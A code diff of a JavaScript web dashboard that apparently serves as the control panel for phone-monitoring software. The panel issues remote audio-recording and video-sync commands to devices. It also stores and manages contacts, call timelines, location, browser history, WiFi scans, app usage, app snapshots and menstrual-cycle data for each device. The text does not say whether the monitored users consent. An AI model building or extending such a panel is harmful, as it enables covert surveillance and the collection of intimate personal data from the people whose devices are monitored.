-}
-
-function openVideoLightbox(btn) {
-  const pwrap = btn.closest('.pwrap');
-  if (!pwrap) return;
-  const base64 = pwrap.dataset.base64;
-  const mimeType = pwrap.dataset.mime || 'video/mp4';
-  const fileName = pwrap.dataset.filename || 'Video';
-  
-  if (!base64) { showAlert('No video data', 'error'); return; }
-  
-  try {
-    const binary = atob(base64);
-    const bytes = new Uint8Array(binary.length);
-    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-    const blob = new Blob([bytes], { type: mimeType });
-    const url = URL.createObjectURL(blob);
-    
-    const lightbox = document.getElementById('lightbox');
-    const img = document.getElementById('lightboxImg');
-    img.style.display = 'none';
-    
-    // Remove any old video element
-    const oldVid = lightbox.querySelector('video');
-    if (oldVid) oldVid.remove();
-    
-    const vid = document.createElement('video');
-    vid.controls = true;
-    vid.style.maxWidth = '95vw';
-    vid.style.maxHeight = '95vh';
-    vid.style.display = 'block';
-    vid.style.margin = 'auto';
-    vid.src = url;
-    vid.play();
-    lightbox.appendChild(vid);
-    lightbox.classList.add('open');
-    
-    lightbox.onclick = () => {
-      vid.pause();
-      vid.src = '';
-      URL.revokeObjectURL(url);
-      lightbox.classList.remove('open');
-      if (oldVid) oldVid.remove();
-    };
-    
-    document.getElementById('lightboxCaption').textContent = fileName;
-  } catch (e) {
-    showAlert('Failed to play video: ' + e.message, 'error');
-  }
-}
-
-async function deleteVideo(videoId) {
-  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
-  if (!confirm('Delete this video from RTDB?')) return;
-  try {
-    await deleteRTDB(`devices/${selectedDevice}/videos/${videoId}`);
-    try {
-      const storagePath = `videos/${selectedDevice}/${videoId}`;
-      await deleteStorageFile(storagePath);
-    } catch (se) {
-      console.warn('Storage delete optional:', se.message);
-    }
-    showAlert('Video deleted', 'warn');
-    pollVideos();
-    await refreshStorage();
-  } catch (e) {
-    showAlert('Delete failed: ' + e.message, 'error');
-  }
-}
-
-async function triggerVideoSync() {
-  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
-  try {
-    const resp = await fetch(`${RTDB}/devices/${selectedDevice}/commands/video_sync.json`, {
-      method: 'PUT',
-      body: JSON.stringify({ ts: Date.now(), action: 'sync_videos' })
-    });
-    if (resp.ok) {
-      showAlert('Video sync command sent', 'success');
-    } else {
-      showAlert('Failed to send sync command', 'error');
-    }
-  } catch (e) {
-    showAlert('Error: ' + e.message, 'error');
-  }
-}
-
 async function pollContacts() {
   if (!selectedDevice) return;
   const list = document.getElementById('contactsList');
@@ -3243,6 +2793,20 @@ document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     else pollHistory();
   });
 });
+document.querySelectorAll('.chip[data-vsource]').forEach(chip => {
+  chip.addEventListener('click', () => {
+    document.querySelectorAll('.chip[data-vsource]').forEach(c => c.classList.remove('active'));
+    chip.classList.add('active');
+    videoSourceFilter = chip.dataset.vsource;
+    videoOffset = 0;
+    const grid = document.getElementById('videoGrid');
+    grid.innerHTML = '';
+    const container = document.getElementById('videoLoadMoreContainer');
+    container.innerHTML = '';
+    if (cachedVideos && Object.keys(cachedVideos).length) loadMoreVideos();
+    else pollVideos();
+  });
+});
 document.getElementById('timelinePeriod')?.addEventListener('change', () => {
   timelineOffset = 0;
   if (timelineCache) renderTimeline(timelineCache);
@@ -3694,7 +3258,6 @@ async function deleteVoiceNote(batchKey, noteIndex) {
       });
     }
     showAlert(`Deleted voice note: ${note.fileName || 'unknown'}`, 'warn');
-    try { await cacheDelete('voiceNoteMeta', `${batchKey}_${noteIndex}`); } catch (e) {}
     pollVoiceNotes();
     await refreshStorage();
   } catch (e) {
@@ -3705,12 +3268,11 @@ async function deleteVoiceNote(batchKey, noteIndex) {
 // --- Remote Recording Functions ---
 
 async function startRemoteRecording() {
-  if (!recordingDevice) { showAlert('No device selected', 'error'); return; }
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
   
   const durationSec = parseInt(document.getElementById('recDuration').value);
   const requestId = 'rec_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-  const cmdUrl = `${RTDB}/devices/${recordingDevice}/commands/audio_record.json`;
-  const devLabel = document.querySelector(`#recDeviceSelect option[value="${recordingDevice}"]`)?.textContent || recordingDevice;
+  const cmdUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record.json`;
   
   const btn = document.getElementById('btnStartRecord');
   const cancelBtn = document.getElementById('btnCancelRecord');
@@ -3748,7 +3310,7 @@ async function startRemoteRecording() {
     });
     if (!resp.ok) throw new Error('HTTP ' + resp.status);
     
-    status.textContent = `Recording on ${devLabel} (${durationSec}s)...`;
+    status.textContent = `Recording started (${durationSec}s)...`;
     progressBar.value = 0;
     progressLabel.textContent = 'Waiting for device...';
     progressTime.textContent = '';
@@ -3769,7 +3331,7 @@ async function startRemoteRecording() {
 }
 
 async function cancelRemoteRecording() {
-  if (!recordingDevice) return;
+  if (!selectedDevice) return;
   
   const recordingId = currentRecordingId;
   if (!recordingId) {
@@ -3777,7 +3339,7 @@ async function cancelRemoteRecording() {
     return;
   }
   
-  const cmdUrl = `${RTDB}/devices/${recordingDevice}/commands/audio_record.json`;
+  const cmdUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record.json`;
   try {
     const resp = await fetch(cmdUrl, {
       method: 'PUT',
@@ -3796,9 +3358,9 @@ async function cancelRemoteRecording() {
 }
 
 async function pollRecordingProgress(requestId, durationSec) {
-  if (!recordingDevice) return;
+  if (!selectedDevice) return;
   
-  currentRecordingId = null;
+  let currentRecordingId = null;
   const startTime = Date.now();
   const btn = document.getElementById('btnStartRecord');
   const cancelBtn = document.getElementById('btnCancelRecord');
@@ -3814,7 +3376,7 @@ async function pollRecordingProgress(requestId, durationSec) {
   const poll = async () => {
     try {
       // First check recording status for live updates
-      const statusUrl = `${RTDB}/devices/${recordingDevice}/recordingStatus.json`;
+      const statusUrl = `${RTDB}/devices/${selectedDevice}/recordingStatus.json`;
       const statusResp = await fetch(statusUrl);
       if (statusResp.ok) {
         const allStatus = await statusResp.json();
@@ -3843,7 +3405,7 @@ async function pollRecordingProgress(requestId, durationSec) {
     } catch (e) {}
     
     // Also check command response for final status
-      const responseUrl = `${RTDB}/devices/${recordingDevice}/commands/responses/${requestId}.json`;
+      const responseUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record/response.json`;
       try {
         const resp = await fetch(responseUrl);
         if (resp.ok) {
@@ -3852,13 +3414,8 @@ async function pollRecordingProgress(requestId, durationSec) {
             if (data.status === 'started') {
               progressLabel.textContent = 'Recording in progress...';
               status.textContent = 'Recording...';
-            } else if (data.status === 'completed' || data.status === 'uploaded') {
-              status.textContent = 'Recording complete ✓';
-              progressLabel.textContent = 'Upload complete';
-              progressBar.value = 100;
-              try { await pollRecordings(); } catch (e) {}
-              resetRecordingUI();
-              return;
+            } else if (data.status === 'completed') {
+              status.textContent = 'Recording completed, uploading...';
             } else if (data.status === 'error') {
               showAlert('Recording failed: ' + data.message, 'error');
               resetRecordingUI();
@@ -3876,8 +3433,9 @@ async function pollRecordingProgress(requestId, durationSec) {
       }
       progressTime.textContent = `${elapsed}s / ${durationSec}s`;
       
-      if (elapsed >= durationSec + 30) {
-        try { await pollRecordings(); } catch (e) {}
+      if (elapsed >= durationSec + 5) {
+        // Recording should be done, fetch new recordings
+        await fetchRecordings();
         resetRecordingUI();
         return;
       }
@@ -3905,19 +3463,19 @@ function resetRecordingUI() {
 }
 
 async function cleanupOldRecordings(days) {
-  if (!recordingDevice) { showAlert('No device selected', 'error'); return; }
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
   if (!confirm(`Delete all recordings older than ${days} day(s)? This cannot be undone.`)) return;
   
   const cutoff = Date.now() - days * 24 * 60 * 60 * 1000;
   let deleted = 0;
   
   try {
-    const data = await fetchRTDB(`devices/${recordingDevice}/recordings`);
+    const data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
     if (!data || typeof data !== 'object') { showAlert('No recordings found', 'warn'); return; }
     
     for (const [id, rec] of Object.entries(data)) {
       if (rec.createdAt && parseInt(rec.createdAt) < cutoff) {
-        await deleteRTDB(`devices/${recordingDevice}/recordings/${id}`);
+        await deleteRTDB(`devices/${selectedDevice}/recordings/${id}`);
         deleted++;
       }
     }
@@ -3929,12 +3487,12 @@ async function cleanupOldRecordings(days) {
 }
 
 async function fetchRecordings() {
-  if (!recordingDevice) return;
+  if (!selectedDevice) return;
   const list = document.getElementById('recordingsList');
   list.innerHTML = '<div class="label">Loading...</div>';
   
   try {
-    const data = await fetchRTDB(`devices/${recordingDevice}/recordings`);
+    const data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
     if (!data || typeof data !== 'object') {
       list.innerHTML = '<div class="label">No remote recordings yet</div>';
       return;
@@ -4053,13 +3611,19 @@ function formatDuration(sec) {
   const s = sec % 60;
   return `${m}:${s.toString().padStart(2, '0')}`;
 }async function deleteRecording(recordingId) {
-  if (!recordingDevice) { showAlert('No device selected', 'error'); return; }
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
   if (!confirm('Delete this recording?')) return;
   
   try {
-    // Delete from RTDB (parts are base64 inside RTDB — no Storage to clean)
-    await deleteRTDB(`devices/${recordingDevice}/recordings/${recordingId}`);
-    try { await cacheDelete('recordingMeta', recordingId); } catch (e) {}
+    // Delete from Storage
+    const rec = await fetchRTDB(`devices/${selectedDevice}/recordings/${recordingId}`);
+    if (rec && rec.parts) {
+      for (const partPath of rec.parts) {
+        await deleteStorageFile(partPath);
+      }
+    }
+    // Delete from RTDB
+    await deleteRTDB(`devices/${selectedDevice}/recordings/${recordingId}`);
     showAlert('Recording deleted', 'warn');
     await fetchRecordings();
   } catch (e) {
@@ -4085,11 +3649,11 @@ async function deleteStorageFile(storagePath) {
 
 async function deleteRecordingsFromStorage() {
   try {
-    const data = await fetchRTDB(`devices/${recordingDevice}/recordings`, 'shallow=true');
+    const data = await fetchRTDB(`devices/${selectedDevice}/recordings`, 'shallow=true');
     if (!data || typeof data !== 'object') return;
     
     for (const key of Object.keys(data)) {
-      const rec = await fetchRTDB(`devices/${recordingDevice}/recordings/${key}`);
+      const rec = await fetchRTDB(`devices/${selectedDevice}/recordings/${key}`);
       if (rec && rec.parts) {
         for (const partPath of rec.parts) {
           await deleteStorageFile(partPath);
@@ -4107,10 +3671,9 @@ async function getAuthToken() {
   return null;
 }
 
-// Override the voice tab click handler to fetch recordings and voice notes
+// Override the voice tab click handler to also fetch recordings
 document.querySelector('[data-tab="voice"]').addEventListener('click', () => {
   setTimeout(pollRecordings, 100);
-  setTimeout(pollVoiceNotes, 200);
 });
 
 async function estimateNodeSize(path, sampleSize = 3) {
@@ -4142,7 +3705,7 @@ async function refreshStorage() {
   el.innerHTML = '<div class="skel skel-block"></div><div class="skel skel-line w50"></div><div class="skel skel-line w30"></div>';
   const devicePath = `devices/${selectedDevice}`;
   try {
-    const [photos, voice, recordings, timeline, contacts, apps, location, browser, wifi, haidh, exercise, steps, metrics, activity, videos] = await Promise.all([
+    const [photos, voice, recordings, timeline, contacts, apps, location, browser, wifi, haidh, exercise, steps, metrics, activity, appSnapshots] = await Promise.all([
       estimateNodeSize(`${devicePath}/photos`, 3),
       estimateNodeSize(`${devicePath}/voice_notes`, 2),
       estimateNodeSize(`${devicePath}/recordings`, 2),
@@ -4157,13 +3720,12 @@ async function refreshStorage() {
       estimateNodeSize(`${devicePath}/steps`, 1),
       estimateNodeSize(`${devicePath}/metrics`, 1),
       estimateNodeSize(`${devicePath}/activity`, 1),
-      estimateNodeSize(`${devicePath}/videos`, 1)
+      estimateNodeSize(`${devicePath}/appSnapshots`, 1)
     ]);
     const categories = [
       { name: 'Photos', icon: '📸', path: 'photos', ...photos },
       { name: 'Voice Notes', icon: '🎤', path: 'voice_notes', ...voice },
       { name: 'Recordings', icon: '🎙️', path: 'recordings', ...recordings },
-      { name: 'Videos', icon: '🎬', path: 'videos', ...videos },
       { name: 'Timeline', icon: '📞', path: 'timeline', ...timeline },
       { name: 'Contacts', icon: '👥', path: 'contacts', ...contacts },
       { name: 'App Usage', icon: '📊', path: 'apps', ...apps },
@@ -4174,7 +3736,8 @@ async function refreshStorage() {
       { name: 'Exercise', icon: '🏋️', path: 'exercise', ...exercise },
       { name: 'Steps', icon: '👟', path: 'steps', ...steps },
       { name: 'Metrics', icon: '📈', path: 'metrics', ...metrics },
-      { name: 'Activity', icon: '🏃', path: 'activity', ...activity }
+      { name: 'Activity', icon: '🏃', path: 'activity', ...activity },
+      { name: 'App Snapshots', icon: '📸', path: 'appSnapshots', ...appSnapshots }
     ];
     let totalBytes = 0;
     for (const cat of categories) totalBytes += cat.bytes;
@@ -4210,14 +3773,11 @@ function renderCleanupActions(categories) {
       dedup: { action: 'dedupPhotos', label: '🧹 Dedup', desc: 'Remove duplicate photos (keep highest quality)' },
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove all uploaded photos', dangerous: true } },
     { group: 'Media', label: 'Voice Notes', icon: '🎤', path: 'voice_notes',
-      dedup: { action: 'dedupVoiceNotes', label: '🧹 Dedup', desc: 'Remove duplicate voice notes (same timestamp & duration)' },
+      dedup: null,
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove all voice recordings', dangerous: true } },
     { group: 'Media', label: 'Recordings', icon: '🎙️', path: 'recordings',
-      dedup: { action: 'dedupRecordings', label: '🧹 Dedup', desc: 'Remove duplicate recording entries (same timestamp & duration)' },
+      dedup: null,
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove all remote recordings', dangerous: true } },
-    { group: 'Media', label: 'Videos', icon: '🎬', path: 'videos',
-      dedup: { action: 'dedupVideos', label: '🧹 Dedup', desc: 'Remove duplicate videos (same timestamp & size)' },
-      del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove all videos', dangerous: true } },
     // Health
     { group: 'Health', label: 'Menstrual Cycle', icon: '🩸', path: 'haidh',
       dedup: { action: 'dedupHaidh', label: '🧹 Dedup', desc: 'Remove duplicate cycle entries (same date)' },
@@ -4226,34 +3786,37 @@ function renderCleanupActions(categories) {
       dedup: { action: 'dedupExercise', label: '🧹 Dedup', desc: 'Remove duplicate exercise entries (same date)' },
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove all exercise & step data', dangerous: true } },
     { group: 'Health', label: 'Steps', icon: '👟', path: 'steps',
-      dedup: { action: 'dedupSteps', label: '🧹 Dedup', desc: 'Remove duplicate step entries (same date)' },
+      dedup: null,
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove all step history', dangerous: true } },
     { group: 'Health', label: 'Metrics', icon: '📈', path: 'metrics',
-      dedup: { action: 'dedupMetrics', label: '🧹 Dedup', desc: 'Remove duplicate metric entries (same timestamp)' },
+      dedup: null,
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove device metrics snapshots', dangerous: true } },
     { group: 'Health', label: 'Activity', icon: '🏃', path: 'activity',
-      dedup: { action: 'dedupActivity', label: '🧹 Dedup', desc: 'Remove duplicate activity entries (same timestamp & type)' },
+      dedup: null,
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove activity recognition history', dangerous: true } },
     // Location & Timeline
     { group: 'Location', label: 'Location', icon: '📍', path: 'location',
       dedup: { action: 'dedupLocations', label: '🧹 Dedup', desc: 'Remove duplicate location entries' },
       del: { action: 'deleteLocHistory', label: '🗑 Delete', desc: 'Remove location history (keeps current)', dangerous: true } },
     { group: 'Location', label: 'Timeline', icon: '📞', path: 'timeline',
-      dedup: { action: 'dedupTimeline', label: '🧹 Dedup', desc: 'Remove duplicate timeline entries (same timestamp, type & contact)' },
+      dedup: null,
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove call logs & timeline events', dangerous: true } },
     // System
     { group: 'System', label: 'App Usage', icon: '📊', path: 'apps',
-      dedup: { action: 'dedupAppUsage', label: '🧹 Dedup', desc: 'Remove duplicate app usage entries (same package & date)' },
+      dedup: null,
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove app usage history', dangerous: true } },
     { group: 'System', label: 'Browser', icon: '🌐', path: 'browser_history',
-      dedup: { action: 'dedupBrowser', label: '🧹 Dedup', desc: 'Remove duplicate browser history entries (same URL & timestamp)' },
+      dedup: null,
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove all browsing history', dangerous: true } },
     { group: 'System', label: 'WiFi', icon: '📡', path: 'wifi_scan',
-      dedup: { action: 'dedupWifi', label: '🧹 Dedup', desc: 'Remove duplicate WiFi scan entries (same SSID/BSSID & timestamp)' },
+      dedup: null,
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove all WiFi scan data', dangerous: true } },
     { group: 'System', label: 'Contacts', icon: '👥', path: 'contacts',
       dedup: { action: 'dedupContacts', label: '🧹 Dedup', desc: 'Merge duplicate contacts by phone number' },
       del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove all contacts', dangerous: true } },
+    { group: 'System', label: 'App Snapshots', icon: '📸', path: 'appSnapshots',
+      dedup: null,
+      del: { action: 'deleteAll', label: '🗑 Delete', desc: 'Remove all app snapshots', dangerous: true } },
   ];
 
   // Group by category
@@ -4368,96 +3931,6 @@ async function execCleanup(action, path) {
     showAlert(`Deleted ${deleted} duplicate photos (freed ${formatBytes(freed)})`, deleted > 0 ? 'warn' : 'error');
     return;
   }
-  if (action === 'dedupVoiceNotes') {
-    if (!confirm('Scan and remove duplicate voice notes? Only one entry per unique timestamp and duration will be kept.')) return;
-    showAlert('Scanning voice notes...', 'warn');
-    const keys = await fetchRTDB(`${base}/voice_notes`, 'shallow=true');
-    if (!keys || typeof keys !== 'object') { showAlert('No voice notes found', 'error'); return; }
-    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-    const groups = {};
-    let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/voice_notes/${k}`);
-      if (doc && doc.ts_ms && doc.duration_ms) {
-        const gk = `${doc.ts_ms}|${doc.duration_ms}`;
-        if (!groups[gk]) groups[gk] = [];
-        groups[gk].push({ key: k });
-      }
-      scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning voice note ${scanned}/${allKeys.length}...</div>`;
-    }
-    let deleted = 0;
-    for (const [gk, entries] of Object.entries(groups)) {
-      if (entries.length <= 1) continue;
-      entries.sort((a, b) => parseInt(b.key) - parseInt(a.key));
-      for (let i = 1; i < entries.length; i++) {
-        if (await deleteRTDB(`${base}/voice_notes/${entries[i].key}`)) deleted++;
-      }
-    }
-    showAlert(`Deleted ${deleted} duplicate voice notes`, deleted > 0 ? 'warn' : 'error');
-    await refreshStorage();
-    return;
-  }
-  if (action === 'dedupVideos') {
-    if (!confirm('Scan and remove duplicate videos? Only one entry per unique timestamp and size will be kept.')) return;
-    showAlert('Scanning videos...', 'warn');
-    const keys = await fetchRTDB(`${base}/videos`, 'shallow=true');
-    if (!keys || typeof keys !== 'object') { showAlert('No videos found', 'error'); return; }
-    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-    const groups = {};
-    let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/videos/${k}`);
-      if (doc && doc.dateAdded && doc.sizeBytes) {
-        const gk = `${doc.dateAdded}|${doc.sizeBytes}`;
-        if (!groups[gk]) groups[gk] = [];
-        groups[gk].push({ key: k });
-      }
-      scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning video ${scanned}/${allKeys.length}...</div>`;
-    }
-    let deleted = 0;
-    for (const [gk, entries] of Object.entries(groups)) {
-      if (entries.length <= 1) continue;
-      entries.sort((a, b) => parseInt(b.key) - parseInt(a.key));
-      for (let i = 1; i < entries.length; i++) {
-        if (await deleteRTDB(`${base}/videos/${entries[i].key}`)) deleted++;
-      }
-    }
-    showAlert(`Deleted ${deleted} duplicate videos`, deleted > 0 ? 'warn' : 'error');
-    await refreshStorage();
-    return;
-  }
-  if (action === 'dedupRecordings') {
-    if (!confirm('Scan and remove duplicate recording entries? Only one entry per unique timestamp and duration will be kept.')) return;
-    showAlert('Scanning recordings...', 'warn');
-    const keys = await fetchRTDB(`${base}/recordings`, 'shallow=true');
-    if (!keys || typeof keys !== 'object') { showAlert('No recordings found', 'error'); return; }
-    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-    const groups = {};
-    let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/recordings/${k}`);
-      if (doc && doc.createdAt && doc.durationSec) {
-        const gk = `${doc.createdAt}|${doc.durationSec}`;
-        if (!groups[gk]) groups[gk] = [];
-        groups[gk].push({ key: k });
-      }
-      scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning recording ${scanned}/${allKeys.length}...</div>`;
-    }
-    let deleted = 0;
-    for (const [gk, entries] of Object.entries(groups)) {
-      if (entries.length <= 1) continue;
-      entries.sort((a, b) => parseInt(b.key) - parseInt(a.key));
-      for (let i = 1; i < entries.length; i++) {
-        if (await deleteRTDB(`${base}/recordings/${entries[i].key}`)) deleted++;
-      }
-    }
-    showAlert(`Deleted ${deleted} duplicate recordings`, deleted > 0 ? 'warn' : 'error');
-    await refreshStorage();
-    return;
-  }
   if (action === 'dedupContacts') {
     if (!confirm('Scan and remove duplicate contacts? Only one entry per unique phone number will be kept (preferring entries with names).')) return;
     showAlert('Scanning contacts...', 'warn');
@@ -4527,9 +4000,6 @@ async function execCleanup(action, path) {
     } else if (path === 'recordings') {
       fullPath = `${base}/recordings`;
       confirmMsg = `Delete ALL remote recordings?\nThis will also delete audio files from Firebase Storage.\nThis cannot be undone.`;
-    } else if (path === 'videos') {
-      fullPath = `${base}/videos`;
-      confirmMsg = `Delete ALL videos?\nThis cannot be undone.`;
     }
     
     if (!confirm(confirmMsg)) return;
@@ -4725,221 +4195,6 @@ async function execCleanup(action, path) {
     }
     await refreshStorage();
     showAlert(`Deleted ${deleted} duplicate exercise/step entries`, deleted > 0 ? 'warn' : 'error');
-    return;
-  }
-  if (action === 'dedupMetrics') {
-    if (!confirm('Scan and remove duplicate metric entries? Only one entry per unique timestamp will be kept.')) return;
-    showAlert('Scanning metrics...', 'warn');
-    const keys = await fetchRTDB(`${base}/metrics`, 'shallow=true');
-    if (!keys || typeof keys !== 'object') { showAlert('No metrics found', 'error'); return; }
-    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-    const groups = {};
-    let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/metrics/${k}`);
-      if (doc && doc.ts_ms) {
-        const gk = Math.floor(doc.ts_ms / 1000); // Dedup by second
-        if (!groups[gk]) groups[gk] = [];
-        groups[gk].push({ key: k });
-      }
-      scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning metrics ${scanned}/${allKeys.length}...</div>`;
-    }
-    let deleted = 0;
-    for (const [gk, entries] of Object.entries(groups)) {
-      if (entries.length <= 1) continue;
-      entries.sort((a, b) => parseInt(b.key) - parseInt(a.key));
-      for (let i = 1; i < entries.length; i++) {
-        if (await deleteRTDB(`${base}/metrics/${entries[i].key}`)) deleted++;
-      }
-    }
-    showAlert(`Deleted ${deleted} duplicate metric entries`, deleted > 0 ? 'warn' : 'error');
-    await refreshStorage();
-    return;
-  }
-  if (action === 'dedupSteps') {
-    if (!confirm('Scan and remove duplicate step entries? Only one entry per unique date will be kept.')) return;
-    showAlert('Scanning steps...', 'warn');
-    const dailySteps = await fetchRTDB(`${base}/steps/daily`, 'shallow=true');
-    if (!dailySteps || typeof dailySteps !== 'object') { showAlert('No daily steps found', 'error'); return; }
-    const allKeys = Object.keys(dailySteps).sort((a, b) => parseInt(b) - parseInt(a));
-    const groups = {};
-    let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/steps/daily/${k}`);
-      if (doc && doc.date) {
-        const gk = doc.date;
-        if (!groups[gk]) groups[gk] = [];
-        groups[gk].push({ key: k, ts: doc.timestamp || 0 });
-      }
-      scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning steps ${scanned}/${allKeys.length}...</div>`;
-    }
-    let deleted = 0;
-    for (const [gk, entries] of Object.entries(groups)) {
-      if (entries.length <= 1) continue;
-      entries.sort((a, b) => b.ts - a.ts);
-      for (let i = 1; i < entries.length; i++) {
-        if (await deleteRTDB(`${base}/steps/daily/${entries[i].key}`)) deleted++;
-      }
-    }
-    showAlert(`Deleted ${deleted} duplicate step entries`, deleted > 0 ? 'warn' : 'error');
-    await refreshStorage();
-    return;
-  }
-  if (action === 'dedupActivity') {
-    if (!confirm('Scan and remove duplicate activity entries? Only one entry per unique timestamp and activity type will be kept.')) return;
-    showAlert('Scanning activity...', 'warn');
-    const keys = await fetchRTDB(`${base}/activity`, 'shallow=true');
-    if (!keys || typeof keys !== 'object') { showAlert('No activity entries found', 'error'); return; }
-    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-    const groups = {};
-    let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/activity/${k}`);
-      if (doc && doc.ts_ms && doc.type) {
-        const gk = `${Math.floor(doc.ts_ms / 1000)}|${doc.type}`;
-        if (!groups[gk]) groups[gk] = [];
-        groups[gk].push({ key: k });
-      }
-      scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning activity ${scanned}/${allKeys.length}...</div>`;
-    }
-    let deleted = 0;
-    for (const [gk, entries] of Object.entries(groups)) {
-      if (entries.length <= 1) continue;
-      entries.sort((a, b) => parseInt(b.key) - parseInt(a.key));
-      for (let i = 1; i < entries.length; i++) {
-        if (await deleteRTDB(`${base}/activity/${entries[i].key}`)) deleted++;
-      }
-    }
-    showAlert(`Deleted ${deleted} duplicate activity entries`, deleted > 0 ? 'warn' : 'error');
-    await refreshStorage();
-    return;
-  }
-  if (action === 'dedupTimeline') {
-    if (!confirm('Scan and remove duplicate timeline entries? Only one entry per unique timestamp, type, and contact will be kept.')) return;
-    showAlert('Scanning timeline...', 'warn');
-    const keys = await fetchRTDB(`${base}/timeline`, 'shallow=true');
-    if (!keys || typeof keys !== 'object') { showAlert('No timeline entries found', 'error'); return; }
-    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-    const groups = {};
-    let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/timeline/${k}`);
-      if (doc && doc.ts_ms && doc.type) {
-        const contact = doc.contact || '__none__';
-        const gk = `${Math.floor(doc.ts_ms / 1000)}|${doc.type}|${contact}`;
-        if (!groups[gk]) groups[gk] = [];
-        groups[gk].push({ key: k });
-      }
-      scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning timeline ${scanned}/${allKeys.length}...</div>`;
-    }
-    let deleted = 0;
-    for (const [gk, entries] of Object.entries(groups)) {
-      if (entries.length <= 1) continue;
-      entries.sort((a, b) => parseInt(b.key) - parseInt(a.key));
-      for (let i = 1; i < entries.length; i++) {
-        if (await deleteRTDB(`${base}/timeline/${entries[i].key}`)) deleted++;
-      }
-    }
-    showAlert(`Deleted ${deleted} duplicate timeline entries`, deleted > 0 ? 'warn' : 'error');
-    await refreshStorage();
-    return;
-  }
-  if (action === 'dedupAppUsage') {
-    if (!confirm('Scan and remove duplicate app usage entries? Only one entry per unique package and date will be kept.')) return;
-    showAlert('Scanning app usage...', 'warn');
-    const keys = await fetchRTDB(`${base}/apps`, 'shallow=true');
-    if (!keys || typeof keys !== 'object') { showAlert('No app usage data found', 'error'); return; }
-    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-    const groups = {};
-    let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/apps/${k}`);
-      if (doc && doc.package && doc.date) {
-        const gk = `${doc.package}|${doc.date}`;
-        if (!groups[gk]) groups[gk] = [];
-        groups[gk].push({ key: k });
-      }
-      scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning app usage ${scanned}/${allKeys.length}...</div>`;
-    }
-    let deleted = 0;
-    for (const [gk, entries] of Object.entries(groups)) {
-      if (entries.length <= 1) continue;
-      entries.sort((a, b) => parseInt(b.key) - parseInt(a.key));
-      for (let i = 1; i < entries.length; i++) {
-        if (await deleteRTDB(`${base}/apps/${entries[i].key}`)) deleted++;
-      }
-    }
-    showAlert(`Deleted ${deleted} duplicate app usage entries`, deleted > 0 ? 'warn' : 'error');
-    await refreshStorage();
-    return;
-  }
-  if (action === 'dedupBrowser') {
-    if (!confirm('Scan and remove duplicate browser history entries? Only one entry per unique URL and timestamp will be kept.')) return;
-    showAlert('Scanning browser history...', 'warn');
-    const keys = await fetchRTDB(`${base}/browser_history`, 'shallow=true');
-    if (!keys || typeof keys !== 'object') { showAlert('No browser history found', 'error'); return; }
-    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-    const groups = {};
-    let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/browser_history/${k}`);
-      if (doc && doc.url && doc.ts_ms) {
-        const gk = `${doc.url}|${Math.floor(doc.ts_ms / 1000)}`;
-        if (!groups[gk]) groups[gk] = [];
-        groups[gk].push({ key: k });
-      }
-      scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning browser ${scanned}/${allKeys.length}...</div>`;
-    }
-    let deleted = 0;
